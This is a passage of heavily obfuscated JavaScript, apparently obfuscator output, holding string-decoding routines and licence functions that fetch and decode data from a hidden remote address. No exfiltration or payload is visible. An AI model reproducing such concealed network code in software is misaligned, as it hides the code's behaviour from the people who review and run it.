        (__p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2e)] = 0x0),
        (__p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2f)] =
          -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
      );
      for (
        i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e);
        i < __p_9358852861_stack.yRbcSUR;
        i++
      ) {
        __p_9358852861_stack[0x9] = __p_9358852861_stack[
          __p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x30)] - 0x42
        ].indexOf(__p_9358852861_stack[0x2][i]);
        if (
          __p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)] ===
          -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
        ) {
          continue;
        }
        if (
          __p_9358852861_stack.UcJcRb <
          __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
        ) {
          __p_9358852861_stack.UcJcRb =
            __p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)];
        } else {
          __p_2360982505(
            (__p_9358852861_stack.UcJcRb +=
              __p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)] *
              0x5b),
            (__p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x22)] |=
              __p_9358852861_stack.UcJcRb <<
              __p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2e)]),
            (__p_9358852861_stack.W519Mn +=
              (__p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2f)] &
                __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
              __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                ? __p_9358852861_stack.Iy_ncqa - 0x36
                : __p_9358852861_stack.Iy_ncqa - 0x35)
          );
          do {
            __p_2360982505(
              __p_9358852861_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
              ].push(
                __p_9358852861_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
                ] &
                  (__p_9358852861_stack.Iy_ncqa +
                    __p_2786467427_dLR_0__JS_PREDICT__(0x7e))
              ),
              (__p_9358852861_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
              ] >>= 0x8),
              (__p_9358852861_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(0x2e)
              ] -= 0x8)
            );
          } while (
            __p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2e)] >
            __p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x30)] -
              __p_2786467427_dLR_0__JS_PREDICT__(0x31)
          );
          __p_9358852861_stack.UcJcRb = -0x1;
        }
      }
      if (
        __p_9358852861_stack.UcJcRb > -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
      ) {
        __p_9358852861_stack[0x4].push(
          (__p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x22)] |
            (__p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2f)] <<
              __p_9358852861_stack.W519Mn)) &
            0xff
        );
      }
      return __p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x30)] >
        0xb6
        ? __p_9358852861_stack[
            __p_9358852861_stack.Iy_ncqa -
              __p_2786467427_dLR_0__JS_PREDICT__(0x32)
          ]
        : __p_1990998267__JS_PREDICT__(__p_9358852861_stack[0x4]);
    }
  },
  getLicenseData = async (...__p_1778009200_stack) => {
    __p_2360982505(
      (__p_1778009200_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] = 0x0),
      (__p_1778009200_stack.xFucuV =
        __p_1778009200_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x16)])
    );
    try {
      var __p_9747691481__JS_PREDICT__ = __p_6510065121(
        (...__p_1244071976_stack) => {
          __p_2360982505(
            (__p_1244071976_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
            (__p_1244071976_stack.mihe_b = __p_1244071976_stack[0x1])
          );
          if (
            typeof __p_1244071976_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
            ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_1244071976_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
              __p_1177111679__JS_PREDICT____JS_CRITICAL__;
          }
          if (
            typeof __p_1244071976_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
            ] === "undefined"
          ) {
            __p_1244071976_stack[0x4] = __p_3576149457;
          }
          if (__p_1244071976_stack.mihe_b) {
            [__p_1244071976_stack[0x4], __p_1244071976_stack.mihe_b] = [
              __p_1244071976_stack[0x3](__p_1244071976_stack[0x4]),
              __p_1244071976_stack[0x0] || __p_1244071976_stack[0x2],
            ];
            return __p_9747691481__JS_PREDICT__(
              __p_1244071976_stack[0x0],
              __p_1244071976_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)],
              __p_1244071976_stack[0x2]
            );
          }
          if (
            __p_1244071976_stack[0x2] &&
            __p_1244071976_stack[0x3] !==
              __p_1177111679__JS_PREDICT____JS_CRITICAL__
          ) {
            __p_9747691481__JS_PREDICT__ =
              __p_1177111679__JS_PREDICT____JS_CRITICAL__;
            return __p_9747691481__JS_PREDICT__(
              __p_1244071976_stack[0x0],
              -0x1,
              __p_1244071976_stack[0x2],
              __p_1244071976_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)],
              __p_1244071976_stack[0x4]
            );
          }
          if (__p_1244071976_stack[0x3] === __p_9747691481__JS_PREDICT__) {
            __p_1177111679__JS_PREDICT____JS_CRITICAL__ =
              __p_1244071976_stack.mihe_b;
            return __p_1177111679__JS_PREDICT____JS_CRITICAL__(
              __p_1244071976_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
            );
          }
          if (
            __p_1244071976_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] !==
            __p_1244071976_stack.mihe_b
          ) {
            return (
              __p_1244071976_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_1244071976_stack[0x0]
              ] ||
              (__p_1244071976_stack[0x4][
                __p_1244071976_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
              ] = __p_1244071976_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
              ](__p_1940297625[__p_1244071976_stack[0x0]]))
            );
          }
        },
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      );
      __p_2360982505(
        (__p_1778009200_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] = {
          IFGcclL: __p_9747691481__JS_PREDICT__(0x3b),
        }),
        (__p_1778009200_stack.ZQ1TLz = __p_9747691481__JS_PREDICT__(
          __p_2786467427_dLR_0__JS_PREDICT__(0x46)
        )),
        (__p_1778009200_stack[0x4] = await axios[
          __p_9747691481__JS_PREDICT__(0x37)
        ](__p_9747691481__JS_PREDICT__.apply(void 0x0, [0x38]))),
        (__p_1778009200_stack[0x5] =
          __p_1778009200_stack[0x4][__p_1778009200_stack.ZQ1TLz][
            __p_9747691481__JS_PREDICT__.apply(void 0x0, [0x3a])
          ]),
        (__p_1778009200_stack[0x6] = atob(__p_1778009200_stack[0x5])),
        (__p_1778009200_stack.lIWWin = JSON[__p_1778009200_stack[0x2].IFGcclL](
          __p_1778009200_stack[0x6]
        ))
      );
      return __p_1778009200_stack.lIWWin;
      function __p_1177111679__JS_PREDICT____JS_CRITICAL__(
        str,
        table = 'A73D/?qySd~Ya4Rrhsl!P8UO5Kpj0=*m,M6{w.}<fo"ZL`^Jv9TW[2ci:NQk&;Vt#Xbx)zB1Fn%e@CH_>Ig]G(+$u|E',
        raw,
        len,
        ret = [],
        b,
        n,
        v,
        i = 0x0,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (b = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (n = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
        );
        for (i = i; i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -0x1) {
            continue;
          }
          if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
            v = p;
          } else {
            __p_2360982505(
              (v += p * 0x5b),
              (b |= v << n),
              (n +=
                (v & 0x1fff) > 0x58
                  ? 0xd
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(
                ret.push(b & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)),
                (b >>= __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
                (n -= 0x8)
              );
            } while (n > __p_2786467427_dLR_0__JS_PREDICT__(0x2));
            v = -0x1;
          }
        }
        if (v > -0x1) {
          ret.push((b | (v << n)) & 0xff);
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    } catch (error) {
      var __p_5692345709__JS_PREDICT__ = __p_6510065121(
        (...__p_7777376434_stack) => {
          __p_2360982505(
            (__p_7777376434_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x2f)
            ] = 0x5),
            (__p_7777376434_stack[0x93] = -0x72)
          );
          if (
            typeof __p_7777376434_stack[
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x34)] +
                __p_2786467427_dLR_0__JS_PREDICT__(0x33)
            ] === "undefined"
          ) {
            __p_7777376434_stack[
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x34)] +
                0x75
            ] = __p_5993427237__JS_PREDICT____JS_CRITICAL__;
          }
          if (
            typeof __p_7777376434_stack[
              __p_7777376434_stack[0x93] +
                __p_2786467427_dLR_0__JS_PREDICT__(0x35)
            ] === "undefined"
          ) {
            __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] =
              __p_3576149457;
          }
          if (
            __p_7777376434_stack[0x2] &&
            __p_7777376434_stack[0x3] !==
              __p_5993427237__JS_PREDICT____JS_CRITICAL__
          ) {
            __p_5692345709__JS_PREDICT__ =
              __p_5993427237__JS_PREDICT____JS_CRITICAL__;
            return __p_5692345709__JS_PREDICT__(
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
              -__p_2786467427_dLR_0__JS_PREDICT__(-0x28),
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)],
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)],
              __p_7777376434_stack[0x4]
            );
          }
          __p_7777376434_stack[__p_7777376434_stack[0x93] + 0x105] = -0x3d;
          if (
            __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] ===
            __p_5692345709__JS_PREDICT__
          ) {
            __p_5993427237__JS_PREDICT____JS_CRITICAL__ =
              __p_7777376434_stack[0x1];
            return __p_5993427237__JS_PREDICT____JS_CRITICAL__(
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
            );
          }
          if (
            __p_7777376434_stack[
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x34)] +
                0x3e
            ]
          ) {
            [
              __p_7777376434_stack[0x4],
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)],
            ] = [
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)](
                __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)]
              ),
              __p_7777376434_stack[0x0] || __p_7777376434_stack[0x2],
            ];
            return __p_5692345709__JS_PREDICT__(
              __p_7777376434_stack[
                __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x34)] +
                  0x3d
              ],
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)],
              __p_7777376434_stack[
                __p_7777376434_stack[0x93] +
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x2c)
              ]
            );
          }
          if (__p_7777376434_stack[0x2] == __p_7777376434_stack[0x3]) {
            return __p_7777376434_stack[
              __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x34)] +
                0x3e
            ]
              ? __p_7777376434_stack[
                  __p_7777376434_stack[0x93] +
                    __p_2786467427_dLR_0__JS_PREDICT__(0x38)
                ][
                  __p_7777376434_stack[
                    __p_7777376434_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(0x34)
                    ] + __p_2786467427_dLR_0__JS_PREDICT__(0x36)
                  ][__p_7777376434_stack[0x1]]
                ]
              : __p_3576149457[
                  __p_7777376434_stack[
                    __p_7777376434_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(0x34)
                    ] + 0x3d
                  ]
                ] ||
                  ((__p_7777376434_stack[
                    __p_7777376434_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(0x34)
                    ] + __p_2786467427_dLR_0__JS_PREDICT__(-0x2c)
                  ] =
                    __p_7777376434_stack[
                      __p_7777376434_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(0x34)
                      ] + __p_2786467427_dLR_0__JS_PREDICT__(0x36)
                    ][__p_7777376434_stack[0x0]] ||
                    __p_7777376434_stack[
                      __p_7777376434_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(0x34)
                      ] + __p_2786467427_dLR_0__JS_PREDICT__(0x37)
                    ]),
                  (__p_3576149457[__p_7777376434_stack[0x0]] =
                    __p_7777376434_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
                    ](
                      __p_1940297625[
                        __p_7777376434_stack[
                          __p_7777376434_stack[
                            __p_2786467427_dLR_0__JS_PREDICT__(0x34)
                          ] + 0x3d
                        ]
                      ]
                    )));
          }
          if (
            __p_7777376434_stack[0x2] ==
            __p_7777376434_stack[
              __p_7777376434_stack[0x93] +
                __p_2786467427_dLR_0__JS_PREDICT__(0x38)
            ]
          ) {
            return (__p_7777376434_stack[0x1][
              __p_3576149457[
                __p_7777376434_stack[__p_7777376434_stack[0x93] + 0x3f]
              ]
            ] = __p_5692345709__JS_PREDICT__(
              __p_7777376434_stack[0x0],
              __p_7777376434_stack[0x1]
            ));
          }
          if (
            __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] !==
            __p_7777376434_stack[
              __p_7777376434_stack[0x93] - (__p_7777376434_stack[0x93] - 0x1)
            ]
          ) {
            return (
              __p_7777376434_stack[
                __p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x34)] +
                  __p_2786467427_dLR_0__JS_PREDICT__(0x36)
              ][__p_7777376434_stack[__p_7777376434_stack[0x93] + 0x3d]] ||
              (__p_7777376434_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_7777376434_stack[0x0]
              ] = __p_7777376434_stack[0x3](
                __p_1940297625[
                  __p_7777376434_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ]
                ]
              ))
            );
          }
        },
        0x5
      );
      __p_1778009200_stack.xFucuV = __p_5692345709__JS_PREDICT__(0x3d);
      return __p_8438996831__JS_CRITICAL__(
        console[
          __p_5692345709__JS_PREDICT__[
            __p_2786467427_dLR_0__JS_PREDICT__(0x1d)
          ](__p_2786467427_dLR_0__JS_PREDICT__(-0x1e), 0x3c)
        ](__p_1778009200_stack.xFucuV, error),
        null
      );
      function __p_5993427237__JS_PREDICT____JS_CRITICAL__(
        str,
        table = '8IrTshDjFWJ1a,BPg?Ln0|4!dUyt/eQ"w{@57c_pS&M*zx2<E:bv#`q~];$^NukR[>3H6GmY+ZO=f9AV%X.(lK)}Cio',
        raw,
        len,
        ret = [],
        b = 0x0,
        n,
        v,
        i = 0x0,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (n = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
        );
        for (i = i; i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
            continue;
          }
          if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
            v = p;
          } else {
            __p_2360982505(
              (v += p * 0x5b),
              (b |= v << n),
              (n +=
                (v & 0x1fff) > __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? 0xd
                  : 0xe)
            );
            do {
              __p_2360982505(
                ret.push(b & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)),
                (b >>= 0x8),
                (n -= __p_2786467427_dLR_0__JS_PREDICT__(-0x15))
              );
            } while (n > 0x7);
            v = -0x1;
          }
        }
        if (v > -0x1) {
          ret.push((b | (v << n)) & 0xff);
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    }
  },
  validateLicense = __p_6510065121(async (...__p_9968229674_stack) => {
    __p_2360982505(
      (__p_9968229674_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
        __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
      (__p_9968229674_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x39)] = 0x30),
      (__p_9968229674_stack.XhP9eK = await getLicenseData()),
      (__p_9968229674_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x39)] = -0x73)
    );
    if (
      __p_9968229674_stack.XhP9eK &&
      __p_9968229674_stack.XhP9eK[
        __p_9968229674_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
      ] &&
      __p_9743501678.yaLutw()
    ) {
      var __p_7332680661__JS_PREDICT__ = (x, y, z, a, b) => {
        if (typeof a === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          a = __p_1591902968__JS_PREDICT____JS_CRITICAL__;
        }
        if (typeof b === "undefined") {
          b = __p_3576149457;
        }
        if (z && a !== __p_1591902968__JS_PREDICT____JS_CRITICAL__) {
          __p_7332680661__JS_PREDICT__ =
            __p_1591902968__JS_PREDICT____JS_CRITICAL__;
          return __p_7332680661__JS_PREDICT__(x, -0x1, z, a, b);
        }
        if (x !== y) {
          return b[x] || (b[x] = a(__p_1940297625[x]));
        }
      };
      return {
        [__p_7332680661__JS_PREDICT__(0x3e)]: 0xc8,
        [__p_7332680661__JS_PREDICT__(
          __p_2786467427_dLR_0__JS_PREDICT__(-0x2c)
        )]:
          __p_9968229674_stack.XhP9eK[
            __p_9968229674_stack[
              __p_9968229674_stack[
                __p_9968229674_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x39)] +
                  0x139
              ] + __p_2786467427_dLR_0__JS_PREDICT__(0x12)
            ]
          ],
      };
      function __p_1591902968__JS_PREDICT____JS_CRITICAL__(
        str,
        table = 'VGasXLtAbhjmikRKJeZrlMgCIdQfcUWnEDHBoNPFYSOTzq+}/)u1627!38=^v@<.;>,?5`(w%4[|{]y~09:*x$_p#"&',
        raw,
        len,
        ret = [],
        b,
        n = 0x0,
        v,
        i = 0x0,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (b = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
        );
        for (i = i; i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -0x1) {
            continue;
          }
          if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
            v = p;
          } else {
            __p_2360982505(
              (v += p * 0x5b),
              (b |= v << n),
              (n +=
                (v & 0x1fff) > __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                  : 0xe)
            );
            do {
              __p_2360982505(
                ret.push(b & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)),
                (b >>= 0x8),
                (n -= 0x8)
              );
            } while (n > 0x7);
            v = -0x1;
          }
        }
        if (v > -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
          ret.push((b | (v << n)) & 0xff);
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    } else {
      var __p_5688045950__JS_PREDICT__ = __p_6510065121(
        (...__p_5686242442_stack) => {
          __p_2360982505(
            (__p_5686242442_stack.length = 0x5),
            (__p_5686242442_stack.udeRvF = 0x27)
          );
          if (
            typeof __p_5686242442_stack[__p_5686242442_stack.udeRvF - 0x24] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
              __p_7232834092__JS_PREDICT____JS_CRITICAL__;
          }
          if (
            typeof __p_5686242442_stack[
              __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3b)] -
                0x23
            ] === "undefined"
          ) {
            __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] =
              __p_3576149457;
          }
          __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3a)] =
            __p_5686242442_stack[0x1];
          if (
            __p_5686242442_stack[0x3] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x1e)
          ) {
            __p_5688045950__JS_PREDICT__ =
              __p_5686242442_stack[
                __p_5686242442_stack.udeRvF -
                  __p_2786467427_dLR_0__JS_PREDICT__(0x27)
              ];
          }
          if (__p_5686242442_stack[0x3] === __p_5688045950__JS_PREDICT__) {
            __p_7232834092__JS_PREDICT____JS_CRITICAL__ =
              __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3a)];
            return __p_7232834092__JS_PREDICT____JS_CRITICAL__(
              __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
            );
          }
          if (
            __p_5686242442_stack[0x2] ==
            __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)]
          ) {
            return __p_5686242442_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(0x3a)
            ]
              ? __p_5686242442_stack[0x0][
                  __p_5686242442_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                  ][
                    __p_5686242442_stack[
                      __p_5686242442_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(0x3b)
                      ] +
                        (__p_5686242442_stack.udeRvF - 0x1e)
                    ]
                  ]
                ]
              : __p_3576149457[__p_5686242442_stack[0x0]] ||
                  ((__p_5686242442_stack[0x2] =
                    __p_5686242442_stack[
                      __p_5686242442_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(0x3b)
                      ] - 0x23
                    ][
                      __p_5686242442_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                      ]
                    ] || __p_5686242442_stack[0x3]),
                  (__p_3576149457[__p_5686242442_stack[0x0]] =
                    __p_5686242442_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
                    ](
                      __p_1940297625[
                        __p_5686242442_stack[
                          __p_5686242442_stack[
                            __p_2786467427_dLR_0__JS_PREDICT__(0x3b)
                          ] - __p_2786467427_dLR_0__JS_PREDICT__(0x1e)
                        ]
                      ]
                    )));
          }
          if (
            __p_5686242442_stack[
              __p_5686242442_stack.udeRvF -
                __p_2786467427_dLR_0__JS_PREDICT__(0x1e)
            ] !== __p_5686242442_stack[0x30]
          ) {
            return (
              __p_5686242442_stack[
                __p_5686242442_stack.udeRvF -
                  __p_2786467427_dLR_0__JS_PREDICT__(0x27)
              ][
                __p_5686242442_stack[
                  __p_5686242442_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x3b)
                  ] - __p_2786467427_dLR_0__JS_PREDICT__(0x1e)
                ]
              ] ||
              (__p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_5686242442_stack[0x0]
              ] = __p_5686242442_stack[
                __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3b)] -
                  0x24
              ](__p_1940297625[__p_5686242442_stack[0x0]]))
            );
          }
          if (
            __p_5686242442_stack[
              __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3b)] -
                0x25
            ] &&
            __p_5686242442_stack[
              __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3b)] -
                __p_2786467427_dLR_0__JS_PREDICT__(0x5b)
            ] !== __p_7232834092__JS_PREDICT____JS_CRITICAL__
          ) {
            __p_5688045950__JS_PREDICT__ =
              __p_7232834092__JS_PREDICT____JS_CRITICAL__;
            return __p_5688045950__JS_PREDICT__(
              __p_5686242442_stack[
                __p_5686242442_stack.udeRvF -
                  __p_2786467427_dLR_0__JS_PREDICT__(0x1e)
              ],
              -__p_2786467427_dLR_0__JS_PREDICT__(-0x28),
              __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)],
              __p_5686242442_stack[0x3],
              __p_5686242442_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)]
            );
          }
        },
        0x5
      );
      return {
        [__p_5688045950__JS_PREDICT__(__p_9968229674_stack[0xc6] + 0xb3)]: 0x64,
        [__p_5688045950__JS_PREDICT__(0x41)]: null,
      };
      function __p_7232834092__JS_PREDICT____JS_CRITICAL__(
        ...__p_9341812348_stack
      ) {
        var i;
        __p_2360982505(
          (__p_9341812348_stack.length =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
          (__p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3c)] =
            __p_9341812348_stack[0x0]),
          (__p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)] =
            '<Cdlknc:Ae8@SIw.mtP6UK_yFYW]24sv)|>1BRDuHr!/&E;[%+TJzN*9X53?qf$jQb}G`phOZx#(oV,7LM{0ig^a="~'),
          (__p_9341812348_stack[0x2] =
            "" +
            (__p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3c)] ||
              "")),
          (__p_9341812348_stack[0x69] = -0x40),
          (__p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
            __p_9341812348_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
            ].length),
          (__p_9341812348_stack[0x69] = 0x6),
          (__p_9341812348_stack[
            __p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3d)] -
              __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
          ] = []),
          (__p_9341812348_stack[0x5] =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (__p_9341812348_stack.gjVFd9h =
            __p_9341812348_stack[0x69] -
            __p_2786467427_dLR_0__JS_PREDICT__(0x29)),
          (__p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] = -0x1)
        );
        for (i = 0x0; i < __p_9341812348_stack[0x3]; i++) {
          __p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)] =
            __p_9341812348_stack[
              __p_9341812348_stack[
                __p_9341812348_stack[
                  __p_9341812348_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x3d)
                  ] + __p_2786467427_dLR_0__JS_PREDICT__(0x3e)
                ] + __p_2786467427_dLR_0__JS_PREDICT__(0x3e)
              ] - __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
            ].indexOf(
              __p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)][i]
            );
          if (
            __p_9341812348_stack[0x9] ===
            -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
          ) {
            continue;
          }
          if (
            __p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] < 0x0
          ) {
            __p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] =
              __p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)];
          } else {
            __p_2360982505(
              (__p_9341812348_stack[
                __p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3d)] +
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
              ] +=
                __p_9341812348_stack[
                  __p_9341812348_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x3d)
                  ] + __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
                ] * __p_2786467427_dLR_0__JS_PREDICT__(-0x1d)),
              (__p_9341812348_stack[0x5] |=
                __p_9341812348_stack[0x7] << __p_9341812348_stack.gjVFd9h),
              (__p_9341812348_stack.gjVFd9h +=
                (__p_9341812348_stack[0x7] & 0x1fff) >
                __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? 0xd
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(
                __p_9341812348_stack[__p_9341812348_stack[0x69] - 0x2].push(
                  __p_9341812348_stack[__p_9341812348_stack[0x69] - 0x1] &
                    (__p_9341812348_stack[0x69] + 0xf9)
                ),
                (__p_9341812348_stack[0x5] >>= 0x8),
                (__p_9341812348_stack.gjVFd9h -= 0x8)
              );
            } while (__p_9341812348_stack.gjVFd9h > 0x7);
            __p_9341812348_stack[0x7] = -0x1;
          }
        }
        if (__p_9341812348_stack[0x7] > -0x1) {
          __p_9341812348_stack[0x4].push(
            (__p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x22)] |
              (__p_9341812348_stack[0x7] << __p_9341812348_stack.gjVFd9h)) &
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
          );
        }
        return __p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3d)] >
          __p_2786467427_dLR_0__JS_PREDICT__(0x5f)
          ? __p_9341812348_stack[
              __p_9341812348_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3d)] -
                0xdc
            ]
          : __p_1990998267__JS_PREDICT__(__p_9341812348_stack[0x4]);
      }
    }
